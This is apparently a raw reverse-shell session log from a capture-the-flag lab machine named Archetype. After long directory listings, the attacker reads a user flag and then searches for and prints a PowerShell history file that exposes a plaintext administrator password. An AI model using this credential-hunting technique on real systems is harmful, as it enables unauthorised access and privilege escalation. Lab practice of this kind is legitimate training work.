Connection from 10.10.10.27:49739
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325
09/15/2018  12:10 AM         4,526,280 setupapi.dll
09/15/2018  12:09 AM           117,760 setupugc.exe
09/15/2018  12:09 AM            46,592 setx.exe
09/15/2018  12:10 AM             2,560 sfc.dll
09/15/2018  12:09 AM            35,840 sfc.exe
09/15/2018  12:10 AM            41,984 sfc_os.dll
09/15/2018  12:09 AM           111,616 shacct.dll
09/15/2018  12:09 AM            58,368 shacctprofile.dll
09/15/2018  12:09 AM           555,440 SHCore.dll
10/29/2018  03:37 PM         5,584,056 shell32.dll
09/15/2018  12:09 AM             8,704 shfolder.dll
09/15/2018  12:09 AM             5,632 shimeng.dll
09/15/2018  12:09 AM           274,224 shlwapi.dll
09/15/2018  12:09 AM           108,032 shsetup.dll
09/15/2018  12:09 AM            23,552 shutdown.exe
09/15/2018  12:09 AM            42,496 signdrv.dll
09/15/2018  12:09 AM             8,192 simpdata.tlb
09/15/2018  12:12 AM    <DIR>          sk-SK
09/15/2018  12:12 AM    <DIR>          sl-SI
09/15/2018  12:10 AM           122,368 slc.dll
09/15/2018  12:09 AM            19,968 slcext.dll
09/15/2018  02:06 AM    <DIR>          slmgr
09/15/2018  12:09 AM           142,904 slmgr.vbs
09/15/2018  12:09 AM            72,704 slwga.dll
09/15/2018  12:09 AM           641,024 SmartcardCredentialProvider.dll
09/15/2018  12:12 AM    <DIR>          SMI
09/15/2018  12:09 AM            20,992 smphost.dll
09/15/2018  12:09 AM            25,600 snmpapi.dll
09/15/2018  12:09 AM           130,560 softkbd.dll
09/15/2018  12:09 AM            24,576 sort.exe
09/15/2018  12:10 AM           164,864 spacebridge.dll
09/15/2018  12:09 AM            82,944 spbcd.dll
09/15/2018  02:06 AM    <DIR>          Speech_OneCore
09/15/2018  12:09 AM            87,040 spfileq.dll
09/15/2018  12:09 AM            83,968 spinf.dll
09/15/2018  12:09 AM             9,216 spnet.dll
09/15/2018  12:09 AM           129,024 spopk.dll
09/15/2018  12:12 AM    <DIR>          spp
09/15/2018  12:10 AM           102,912 sppc.dll
09/15/2018  12:09 AM           483,328 sppcext.dll
09/15/2018  12:10 AM            36,368 sppinst.dll
09/15/2018  12:12 AM    <DIR>          sppui
09/15/2018  12:10 AM           114,688 sppwmi.dll
09/15/2018  12:09 AM           407,552 spwizeng.dll
09/15/2018  12:09 AM         5,865,272 spwizimg.dll
09/15/2018  12:09 AM         5,928,448 spwizimg_svr.dll
09/15/2018  12:09 AM            16,696 spwizres.dll
09/15/2018  12:10 AM           114,688 sqlcecompact40.dll
09/15/2018  12:10 AM           169,472 sqlceoledb40.dll
09/15/2018  12:10 AM           705,536 sqlceqp40.dll
09/15/2018  12:10 AM           414,208 sqlcese40.dll
06/24/2016  05:29 AM         3,006,656 sqlncli11.dll
08/22/2017  07:39 PM            26,289 SQLServerManager14.msc
09/15/2018  12:09 AM           666,112 sqlsrv32.dll
09/15/2018  12:09 AM            94,208 sqlsrv32.rll
09/15/2018  12:09 AM           188,768 sqlunirl.dll
09/15/2018  12:09 AM            17,760 sqlwid.dll
09/15/2018  12:09 AM            43,872 sqlwoa.dll
09/15/2018  12:09 AM            40,432 sqmapi.dll
09/15/2018  12:12 AM    <DIR>          sr-Latn-RS
09/15/2018  12:09 AM           304,128 SrpUxNativeSnapIn.dll
09/15/2018  12:09 AM            74,352 srvcli.dll
09/15/2018  12:09 AM            36,352 sscore.dll
09/15/2018  12:09 AM           122,400 sspicli.dll
09/15/2018  12:09 AM           111,416 SSShim.dll
09/15/2018  12:10 AM            53,760 stclient.dll
09/15/2018  12:09 AM            18,432 stdole2.tlb
09/15/2018  12:09 AM             7,168 stdole32.tlb
09/15/2018  12:09 AM         2,013,696 storagewmi.dll
09/15/2018  12:09 AM            20,480 storagewmi_passthru.dll
09/15/2018  12:09 AM            14,848 subst.exe
09/15/2018  12:12 AM    <DIR>          sv-SE
09/15/2018  12:09 AM            45,448 svchost.exe
09/15/2018  12:10 AM           543,352 sxs.dll
09/15/2018  12:09 AM            19,456 sxshared.dll
09/15/2018  12:09 AM            23,552 sxsstore.dll
09/15/2018  12:10 AM            29,696 sxstrace.exe
09/15/2018  12:09 AM            15,360 syssetup.dll
09/15/2018  12:09 AM            76,800 systeminfo.exe
09/15/2018  12:09 AM            52,224 takeown.exe
09/15/2018  12:09 AM           361,984 taskcomp.dll
09/15/2018  12:09 AM            74,240 taskkill.exe
09/15/2018  12:09 AM            79,360 tasklist.exe
10/29/2018  03:37 PM         1,279,000 Taskmgr.exe
09/15/2018  12:12 AM    <DIR>          Tasks
09/15/2018  12:10 AM           535,600 taskschd.dll
09/15/2018  12:09 AM            36,864 TaskSchdPS.dll
09/15/2018  12:09 AM            42,576 tbs.dll
09/15/2018  12:09 AM           175,616 tcpipcfg.dll
09/15/2018  12:09 AM            10,240 TCPSVCS.EXE
09/15/2018  12:09 AM           625,664 tdh.dll
09/15/2018  12:12 AM    <DIR>          th-TH
09/15/2018  12:09 AM           462,336 timedate.cpl
09/15/2018  12:10 AM             9,216 TimeDateMUICallback.dll
09/15/2018  12:09 AM            25,088 timeout.exe
09/15/2018  12:09 AM            35,840 tlscsp.dll
09/15/2018  12:09 AM            34,304 tokenbinding.dll
09/15/2018  12:10 AM             3,584 TpmCertResources.dll
09/15/2018  12:10 AM           702,976 TpmCoreProvisioning.dll
09/15/2018  12:12 AM    <DIR>          tr-TR
09/15/2018  12:09 AM           376,832 tracerpt.exe
09/15/2018  12:09 AM            15,360 TRACERT.EXE
09/15/2018  12:10 AM            35,328 traffic.dll
09/15/2018  12:09 AM            17,920 tree.com
09/15/2018  12:10 AM            88,064 TrustedSignalCredProv.dll
09/15/2018  12:09 AM           177,152 tscfgwmi.dll
09/15/2018  12:09 AM            19,968 tscon.exe
09/15/2018  12:09 AM            20,480 tsdiscon.exe
09/15/2018  12:09 AM            20,992 tskill.exe
09/15/2018  12:10 AM           121,344 TSpkg.dll
09/15/2018  12:09 AM           189,952 tspubwmi.dll
09/15/2018  12:09 AM            98,304 tssdjet.dll
09/15/2018  12:09 AM            45,056 TSTheme.exe
09/15/2018  12:09 AM         1,720,936 twinapi.appcore.dll
09/15/2018  12:09 AM           499,200 twinapi.dll
09/15/2018  12:10 AM            95,744 txflog.dll
09/15/2018  12:09 AM            11,776 txfw32.dll
09/15/2018  12:09 AM            41,984 typeperf.exe
09/15/2018  12:09 AM             2,560 tzres.dll
09/15/2018  12:09 AM            48,128 tzutil.exe
09/15/2018  12:10 AM            78,336 ualapi.dll
09/15/2018  12:09 AM         1,195,640 ucrtbase.dll
09/15/2018  12:10 AM           104,960 uexfat.dll
09/15/2018  12:09 AM           139,264 ufat.dll
09/15/2018  12:10 AM         2,004,992 UIAutomationCore.dll
09/15/2018  12:09 AM            10,752 UIManagerBrokerps.dll
09/15/2018  12:12 AM    <DIR>          uk-UA
09/15/2018  12:09 AM           149,816 ulib.dll
09/15/2018  12:09 AM            34,304 unlodctr.exe
09/15/2018  12:09 AM           510,464 untfs.dll
09/15/2018  12:10 AM           164,864 updatepolicy.dll
09/15/2018  12:09 AM           681,984 uReFS.dll
09/15/2018  12:09 AM           423,424 uReFSv1.dll
09/15/2018  12:09 AM            24,064 ureg.dll
10/29/2018  03:37 PM         1,762,816 urlmon.dll
09/15/2018  12:09 AM            12,288 usbperf.dll
09/15/2018  12:09 AM             4,608 user.exe
09/15/2018  12:09 AM         1,675,200 user32.dll
09/15/2018  12:09 AM           137,056 userenv.dll
09/15/2018  12:09 AM            27,648 userinit.exe
09/15/2018  12:09 AM            16,896 userinitext.dll
09/15/2018  12:09 AM            77,824 usp10.dll
09/15/2018  12:09 AM            40,232 utildll.dll
09/15/2018  12:09 AM           139,264 uudf.dll
09/15/2018  12:09 AM            66,560 UXInit.dll
09/15/2018  12:09 AM           135,696 uxlib.dll
09/15/2018  12:09 AM            11,784 uxlibres.dll
09/15/2018  12:09 AM           481,280 uxtheme.dll
09/15/2018  12:10 AM           224,256 vaultcli.dll
09/15/2018  12:09 AM           532,480 vbscript.dll
10/10/2017  09:01 PM           404,104 vcamp140.dll
02/10/2016  10:25 PM           247,984 vccorlib120.dll
10/10/2017  09:01 PM           273,560 vccorlib140.dll
10/10/2017  09:01 PM           138,376 vcomp140.dll
10/10/2017  09:01 PM            86,840 vcruntime140.dll
09/15/2018  12:09 AM            17,920 vdmdbg.dll
09/15/2018  12:09 AM            47,616 vds_ps.dll
09/15/2018  12:09 AM           354,440 verifier.dll
09/15/2018  12:09 AM            27,328 version.dll
09/15/2018  12:09 AM            57,360 virtdisk.dll
09/04/2018  05:21 AM           190,856 vm3ddevapi.dll
09/04/2018  05:21 AM        13,202,312 vm3dgl.dll
09/04/2018  05:21 AM           143,752 vm3dglhelper.dll
09/04/2018  05:21 AM           374,152 vm3dum-debug.dll
09/04/2018  05:21 AM           374,152 vm3dum-stats.dll
09/04/2018  05:21 AM           373,640 vm3dum.dll
09/04/2018  05:21 AM           273,288 vm3dum_10-debug.dll
09/04/2018  05:21 AM           273,288 vm3dum_10-stats.dll
09/04/2018  05:21 AM           273,288 vm3dum_10.dll
09/04/2018  05:21 AM            98,184 vm3dum_loader.dll
09/04/2018  05:12 AM           303,536 vmGuestLib.dll
09/04/2018  05:12 AM            52,144 vmGuestLibJava.dll
09/15/2018  12:09 AM            43,008 vpnikeapi.dll
06/22/2018  02:31 AM            42,376 vsocklib.dll
09/15/2018  12:09 AM         1,158,656 vssapi.dll
09/15/2018  12:09 AM            53,760 vsstrace.dll
09/15/2018  12:09 AM            29,184 vss_ps.dll
09/15/2018  12:09 AM           214,016 w32tm.exe
09/15/2018  12:09 AM            28,160 w32topl.dll
09/15/2018  12:09 AM            32,768 waitfor.exe
09/15/2018  02:06 AM    <DIR>          wbem
09/15/2018  12:09 AM           406,016 wbemcomn.dll
09/15/2018  12:09 AM            88,576 wdi.dll
09/15/2018  12:09 AM           186,368 wdigest.dll
09/15/2018  12:09 AM           201,016 wdscore.dll
09/15/2018  12:09 AM           460,288 webio.dll
09/15/2018  12:09 AM           948,288 webservices.dll
09/15/2018  12:09 AM            37,376 Websocket.dll
09/15/2018  12:09 AM            55,808 wecapi.dll
09/15/2018  12:09 AM            78,336 wecutil.exe
09/15/2018  12:09 AM           680,184 wer.dll
09/15/2018  12:09 AM            35,840 werdiagcontroller.dll
09/15/2018  12:09 AM           193,800 weretw.dll
09/15/2018  12:09 AM           445,240 WerFault.exe
09/15/2018  12:09 AM           147,736 WerFaultSecure.exe
09/15/2018  12:09 AM           192,824 wermgr.exe
09/15/2018  12:09 AM           428,032 werui.dll
09/15/2018  12:09 AM           283,032 wevtapi.dll
09/15/2018  12:10 AM            76,800 wevtfwd.dll
09/15/2018  12:09 AM           187,392 wevtutil.exe
09/15/2018  12:10 AM            18,944 wfapigp.dll
09/15/2018  12:09 AM            33,280 where.exe
09/15/2018  12:09 AM            13,824 whhelper.dll
09/15/2018  12:09 AM            59,392 whoami.exe
09/15/2018  12:10 AM             2,404 WimBootCompress.ini
09/15/2018  12:10 AM           605,496 wimgapi.dll
09/15/2018  12:09 AM           320,000 win32k.sys
10/29/2018  03:37 PM         2,721,280 win32kfull.sys
09/15/2018  12:09 AM            88,304 win32u.dll
09/15/2018  12:09 AM           126,464 winbio.dll
09/15/2018  12:09 AM            32,256 winbioext.dll
09/15/2018  12:09 AM           149,488 winbrand.dll
09/15/2018  12:09 AM           332,800 wincorlib.dll
09/15/2018  12:10 AM            37,376 wincredprovider.dll
09/15/2018  12:10 AM           159,232 wincredui.dll
09/15/2018  12:09 AM           281,088 Windows.Devices.Usb.dll
09/15/2018  12:09 AM           406,528 Windows.Graphics.dll
09/15/2018  12:10 AM           127,488 Windows.Internal.UI.Logon.ProxyStub.dll
09/15/2018  12:09 AM           548,864 Windows.Networking.Connectivity.dll
09/15/2018  12:10 AM         6,302,312 windows.storage.dll
09/15/2018  12:10 AM           156,160 Windows.Storage.OneCore.dll
09/15/2018  12:09 AM            18,432 Windows.System.RemoteDesktop.dll
09/15/2018  12:10 AM           238,080 Windows.UI.CredDialogController.dll
10/29/2018  03:37 PM         1,520,208 WindowsCodecs.dll
09/15/2018  12:09 AM           886,272 windowsperformancerecordercontrol.dll
09/15/2018  12:12 AM    <DIR>          WindowsPowerShell
09/15/2018  12:09 AM           766,688 winhttp.dll
09/15/2018  12:10 AM            81,920 winhttpcom.dll
09/15/2018  12:09 AM         4,306,432 wininet.dll
09/15/2018  12:09 AM            37,176 wininitext.dll
09/15/2018  12:09 AM           354,816 winipcfile.dll
09/15/2018  12:09 AM           801,280 winipcsecproc.dll
09/15/2018  12:09 AM            69,120 winipsec.dll
09/15/2018  12:12 AM    <DIR>          WinMetadata
09/15/2018  12:09 AM           134,512 winmm.dll
09/15/2018  12:09 AM           132,392 winmmbase.dll
09/15/2018  12:09 AM         1,646,592 winmsipc.dll
09/15/2018  12:09 AM            72,192 WinMsoIrmProtector.dll
09/15/2018  12:09 AM            19,968 winnlsres.dll
09/15/2018  12:09 AM            28,352 winnsi.dll
09/15/2018  12:09 AM            67,584 WinOpcIrmProtector.dll
09/15/2018  02:06 AM    <DIR>          winrm
09/15/2018  12:09 AM                33 winrm.cmd
09/15/2018  12:09 AM           204,105 winrm.vbs
09/15/2018  12:10 AM            43,008 winrs.exe
09/15/2018  12:10 AM            95,744 winrscmd.dll
09/15/2018  12:10 AM            24,064 winrshost.exe
09/15/2018  12:10 AM             2,048 winrsmgr.dll
09/15/2018  12:10 AM            10,752 winrssrv.dll
09/15/2018  12:09 AM           178,176 WinSCard.dll
09/15/2018  12:09 AM            15,360 winshfhc.dll
09/15/2018  12:09 AM           270,336 winsku.dll
09/15/2018  12:09 AM            72,704 winsockhc.dll
09/15/2018  12:09 AM           414,720 winspool.drv
09/15/2018  12:09 AM           598,944 winsqlite3.dll
09/15/2018  12:09 AM            17,408 WINSRPC.DLL
09/15/2018  12:09 AM           256,704 winsta.dll
09/15/2018  12:09 AM           277,560 wintrust.dll
09/15/2018  12:09 AM           902,248 WinTypes.dll
09/15/2018  12:09 AM            22,016 winusb.dll
09/15/2018  12:09 AM            57,816 wkscli.dll
09/15/2018  12:09 AM           321,024 Wldap32.dll
09/15/2018  12:09 AM            82,824 wldp.dll
09/15/2018  12:09 AM             5,120 wmi.dll
09/15/2018  12:10 AM            39,936 wmiclnt.dll
09/15/2018  12:10 AM           134,656 wmidcom.dll
09/15/2018  12:10 AM           157,696 wmitomi.dll
09/15/2018  12:09 AM            15,360 wmsgapi.dll
09/15/2018  12:10 AM            28,672 WofUtil.dll
09/15/2018  12:09 AM             5,632 wow32.dll
09/15/2018  12:10 AM            15,360 wowreg32.exe
09/15/2018  12:09 AM             4,096 ws2help.dll
09/15/2018  12:09 AM           384,272 ws2_32.dll
09/15/2018  12:09 AM           147,456 wscript.exe
09/15/2018  12:09 AM           567,808 WSDApi.dll
09/15/2018  12:09 AM            21,504 wshcon.dll
09/15/2018  12:09 AM            16,384 wshelper.dll
09/15/2018  12:09 AM            80,896 wshext.dll
09/15/2018  12:09 AM            11,264 wship6.dll
09/15/2018  12:09 AM           123,392 wshom.ocx
09/15/2018  12:10 AM            15,872 wshqos.dll
09/15/2018  12:09 AM            10,752 WSHTCPIP.DLL
09/15/2018  12:10 AM            16,696 wshunix.dll
09/15/2018  12:10 AM            26,112 WsmAgent.dll
09/15/2018  12:09 AM             4,675 wsmanconfig_schema.xml
09/15/2018  12:10 AM            33,280 WSManHTTPConfig.exe
09/15/2018  12:10 AM            63,488 WSManMigrationPlugin.dll
09/15/2018  12:10 AM           141,824 WsmAuto.dll
09/15/2018  12:10 AM            11,776 wsmplpxy.dll
09/15/2018  12:10 AM            39,424 wsmprovhost.exe
09/15/2018  12:09 AM             1,559 WsmPty.xsl
09/15/2018  12:10 AM            61,952 WsmRes.dll
09/15/2018  12:09 AM           121,344 Wsmselpl.dll
09/15/2018  12:09 AM             2,560 Wsmselrr.dll
09/15/2018  12:10 AM         2,465,792 WsmSvc.dll
09/15/2018  12:09 AM             2,426 WsmTxt.xsl
09/15/2018  12:10 AM           230,400 WsmWmiPl.dll
09/15/2018  12:09 AM            52,736 wsnmp32.dll
09/15/2018  12:09 AM            16,384 wsock32.dll
09/15/2018  12:09 AM         1,522,688 wsp_fs.dll
09/15/2018  12:09 AM         1,308,672 wsp_health.dll
09/15/2018  12:09 AM           718,336 wsp_sr.dll
09/15/2018  12:09 AM            52,864 wtsapi32.dll
09/15/2018  12:10 AM           854,016 wuapi.dll
09/15/2018  12:10 AM            71,680 wudriver.dll
09/15/2018  12:10 AM            31,232 wups.dll
09/15/2018  12:10 AM           305,664 wusa.exe
09/15/2018  12:09 AM            44,032 xcopy.exe
09/15/2018  12:09 AM            52,736 xmlfilter.dll
09/15/2018  12:09 AM           173,208 xmllite.dll
09/15/2018  12:09 AM            52,224 xolehlp.dll
09/15/2018  12:12 AM    <DIR>          zh-CN
09/15/2018  12:12 AM    <DIR>          zh-TW
            1244 File(s)    358,645,583 bytes
              80 Dir(s)  33,824,833,536 bytes free

C:\Windows\system32>cd ..

C:\Windows>cd ..

C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\

01/20/2020  05:20 AM    <DIR>          backups
09/15/2018  12:12 AM    <DIR>          PerfLogs
01/19/2020  04:09 PM    <DIR>          Program Files
01/19/2020  04:08 PM    <DIR>          Program Files (x86)
01/19/2020  11:39 PM    <DIR>          Users
08/10/2021  10:07 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  33,824,833,536 bytes free

C:\>cd Users

C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\Users

01/19/2020  04:10 PM    <DIR>          .
01/19/2020  04:10 PM    <DIR>          ..
01/19/2020  11:39 PM    <DIR>          Administrator
01/19/2020  11:39 PM    <DIR>          Public
01/20/2020  06:01 AM    <DIR>          sql_svc
               0 File(s)              0 bytes
               5 Dir(s)  33,824,833,536 bytes free

C:\Users>cd Administratior
The system cannot find the path specified.

C:\Users>cd sql_svc

C:\Users\sql_svc>dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\Users\sql_svc

01/20/2020  06:01 AM    <DIR>          .
01/20/2020  06:01 AM    <DIR>          ..
01/20/2020  06:01 AM    <DIR>          3D Objects
01/20/2020  06:01 AM    <DIR>          Contacts
01/20/2020  06:42 AM    <DIR>          Desktop
01/20/2020  06:01 AM    <DIR>          Documents
01/20/2020  06:01 AM    <DIR>          Downloads
01/20/2020  06:01 AM    <DIR>          Favorites
01/20/2020  06:01 AM    <DIR>          Links
01/20/2020  06:01 AM    <DIR>          Music
01/20/2020  06:01 AM    <DIR>          Pictures
01/20/2020  06:01 AM    <DIR>          Saved Games
01/20/2020  06:01 AM    <DIR>          Searches
01/20/2020  06:01 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  33,824,813,056 bytes free

C:\Users\sql_svc>cd Desktop

C:\Users\sql_svc\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\Users\sql_svc\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:37 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  33,824,813,056 bytes free

C:\Users\sql_svc\Desktop>type user.tt
The system cannot find the file specified.

C:\Users\sql_svc\Desktop>type user.txt
3e7b102e78218e935bf3f4951fec21a3
C:\Users\sql_svc\Desktop>dir\s *history.txt
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\

File Not Found

 Directory of C:\Users\sql_svc\Desktop

File Not Found

C:\Users\sql_svc\Desktop>cd ../../..

C:\>dir\s *history.txt
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\


 Directory of C:\

File Not Found

C:\>dir/s *history.txt
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

03/17/2020  02:36 AM                79 ConsoleHost_history.txt
               1 File(s)             79 bytes

     Total Files Listed:
               1 File(s)             79 bytes
               0 Dir(s)  33,824,755,712 bytes free

C:\>cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

01/20/2020  06:04 AM    <DIR>          .
01/20/2020  06:04 AM    <DIR>          ..
03/17/2020  02:36 AM                79 ConsoleHost_history.txt
               1 File(s)             79 bytes
               2 Dir(s)  33,824,755,712 bytes free

C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit

C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>
